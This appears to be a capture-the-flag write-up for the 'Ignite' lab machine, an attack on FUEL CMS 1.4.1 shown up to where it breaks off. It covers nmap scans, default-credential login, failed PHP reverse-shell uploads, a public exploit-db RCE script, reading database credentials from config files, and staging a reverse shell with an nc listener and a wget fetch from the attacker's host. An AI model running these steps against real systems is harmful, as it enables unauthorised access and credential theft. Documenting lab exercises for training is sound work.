# IGNITE

## The Background

[Fuel Web](https://www.getfuelcms.com/)  

[Fuel GIT](https://github.com/daylightstudio/FUEL-CMS)

Fuel is based on PHP.

## NMAP

### Basic Scan  

`:> nmap -Pn -sV -O 10.201.126.242`  

PORT   STATE SERVICE VERSION  
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))  

### Vulnerability Scan

`:> nmap --script vuln 10.6.15.233`  

![Vuln Scan](assets/ignite-13.png)  

### Target Revealed Ports

`:> nmap 10.6.15.233 -p 3390,5901 -Pn -sV --script vuln`  

![Targeted](assets/ignite-14.png)  

## Visit the Page  

A number of potentially useful instructions  

Default installation directory:  
![Instructions 01](assets/ignite-01.png)  

Software and location of the database:  
![Instructions 02](assets/ignite-02.png)  

Instructions which, if followed, make certain directories very useful for exploitation activities:  
![Instructions 03](assets/ignite-03.png)  

A place to look for hardcoded encryption keys; The potential for a directory above the web root that becomes vulnerable to traversal atacks.  
![Instructions 04](assets/ignite-04.png)  

Finally, default credentials  
![Instructions 05](assets/ignite-05.png)  

### Check robots.txt  

`http://10.201.126.242/robots.txt`  

Webcrawlers are prevented from scanning the FUEL admin portal, unless the webcrawler ignores the robots.txt contents.  
![robots.txt](assets/ignite-06.png)  

### Visit the FUEL admin portal  

Use the default credentials to log into the portal  
Change the password now or later...  

![Admin Portal 01](assets/ignite-07.png)  

### Upload a reverse shell

It's already known that Fuel is based on PHP.

Grab a web shell from Kali's resources.  

![copy php 1](assets/ignite-08.png)  

Edit the shell to add the Attacker IP and port.  

![Edit the php shell](assets/ignite-09.png)  

Attempt, and fail, to upload the php reverse shell.  

![failed upload](assets/ignite-10.png)  

Change the file extension in an attempt to get around the extension checks.  

![change file extension](assets/ignite-11.png)  

Failed to upload a second time.  

![Second failed upload](assets/ignite-12.png) 

Try additional extension including: php1, php2, and php3.

Nothing worked.

## Available Exploits

`:> searchsploit FUEL`  

Several options exist  

![change file extension](assets/ignite-15.png)  

Copy the chosen exploit to a chosen location, in this case the /tmp folder.  

`:> cp /usr/share/exploitdb/exploits/php/webapps/50477.py /tmp/ignite/50477.py`  

Examine the code. Instantiating the script requires a '-u' or '--url' parameter and requires that 'http' is present in the url parameter.  

````python
def get_arguments():
        parser = argparse.ArgumentParser(description='fuel cms fuel CMS 1.4.1 - Remote Code Execution Exploit',usage=f'python3 {sys.argv[>

        parser.add_argument('-v','--version',action='version',version='1.2',help='show the version of exploit')

        parser.add_argument('-u','--url',metavar='url',dest='url',help='Enter the url')

        args = parser.parse_args()

        if len(sys.argv) <=2:
                parser.print_usage()
                sys.exit()

        return args


args = get_arguments()
url = args.url

if "http" not in url:
        sys.stderr.write("Enter vaild url")
        sys.exit()

````  

## Initial Access  

Note: A change in the target (victim) machine due to a restart of the remote target.

### Set up a working environment  

It is not difficult to predict there are going to be multiple steps in gaining access to the target device and performing privilege escalation activites. This will require the ability to work on the target devices and the attacking device.

Use tmux to split the screen, creating panes for the local machine and the remote machine.  

`:> tmux -s ignite`  creates a new tmux session named "ignite"

![New tmux session](assets/ignite-28.png)  

`:>CTRL + b`, then `%` (shift + 5)  

This creates what appears to be a duplicate window. However, these windows are independent and can handle separate tasks.  

![Vertical Split](assets/ignite-29.png)  

If the cursor is not in the right pane, use the following command to move the cursor into the right pane: 

`:>CTRL + b`, then right arrow

From this position, create a horizontal split  

`:>CTRL + b`, then `"` (Double quotes)  

![Three Panes](assets/ignite-30.png)  

If the cursor is not in the left pane, use the following command to move the cursor into the left pane:  

`:>CTRL + b`, then left arrow  

### Gain initial access  

`:> python3 50477.py -u http://10.201.125.124`

Success is identified when the exploit provides a command input prompt.  

![Perform Initial Access](assets/ignite-16a.png)  

Test a few commands. 

![Perform Initial Access](assets/ignite-17a.png)  

### Recon and first flag

Based on the instructions identified on the webpage, identify potential exploit points. 

`:> cat .htaccess`  doesn't reveal anything valuable

![HTACCESS](assets/ignite-18.png)  

`:> cat composer.json`  

Potential additional credentials: "mikey179" or "mikey179/vfsStream"  
  
![Composer.json](assets/ignite-26.png)  

`:> cat fuel/application/config/database.php` has a default username and password  

![db creds](assets/ignite-19.png)  

`:> cat fuel/application/config/config.php | grep encryption`  

No encryption key is set  

![encryption key](assets/ignite-20.png)  

Traverse directories to find the first flag  

`:> ls -alh ../`  

![up 1 level](assets/ignite-21.png)  

`:> ls -alh ../../`  

![Up 2 levels](assets/ignite-22.png)  

`:> ls -alh ../../../`  

![Up 3 Levels](assets/ignite-23.png)  

`:> cat ../../../home/www-data/flag.txt`  
 
![The Flag](assets/ignite-24.png)  

## Privilege escalation  

attempt to use the default password from the database to switch users

`:> su root` with password "mememe"  

Didn't work  

![switch user attempt](assets/ignite-25.png)  

### Upload Reverse Shell  

Move the cursor to the top-right pane. Consistent with previous instructions, use `:>CTRL + b`, then arrow keys to move the cursor among the active panes.

Verify attacker machine ip address  

`:> ip addr show`  

![Attacker IP](assets/ignite-27a.png)  

Modify a php reverse shell to include the attacker IP and an appropriate port. 

![Shell Edit](assets/ignite-29a.png)  

Start a simple server in the upper-right pane.  

`:> python -m http.server 4445`

![Python Shell](assets/ignite-30a.png)

Start a netcat listener in the other pane, using the port in the reverse shell.

`:> nc -lvnp 8888`  

![reverse shell setup](assets/ignite-31.png)  

From the target device, use wget to download the reverse shell from the attacking device  

`:> wget -O myRevShell.php 10.6.15.233:4445/prs.php`  

and observe the download from the attacking device  

![Download](assets/ignite-32.png)  

 

![Download Server](assets/ignite-33.png)



